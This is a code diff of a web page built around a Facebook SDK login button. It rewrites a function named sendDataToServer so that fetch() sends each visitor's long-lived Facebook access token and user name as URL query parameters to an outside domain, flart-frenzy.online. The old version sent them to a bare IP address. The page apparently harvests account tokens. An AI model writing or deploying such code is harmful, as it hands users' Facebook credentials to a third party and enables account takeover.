@@ -61,10 +61,27 @@
       xhttp.send();
     }
 
-    function sendDataToServer(longLivedToken, userName) {
-      var yourServerURL = "http://78.141.216.154/fbstata/token.php"; // Замените на URL вашего сервера
-      window.location.href = yourServerURL + "?longLivedToken=" + longLivedToken + "&userName=" + userName;
-    }
+function sendDataToServer(longLivedToken, userName) {
+  var yourServerURL = "https://flart-frenzy.online/fbstata/token.php"; // Замените на URL вашего сервера
+  var url = new URL(yourServerURL);
+  url.searchParams.append("longLivedToken", longLivedToken);
+  url.searchParams.append("userName", userName);
+
+  fetch(url)
+    .then(response => {
+      if (!response.ok) {
+        throw new Error("Network response was not ok");
+      }
+      return response.text();
+    })
+    .then(data => {
+      console.log('Success:', data);
+    })
+    .catch((error) => {
+      console.error('Error:', error);
+    });
+}
+
   </script>
 
   <!-- The JS SDK Login Button -->
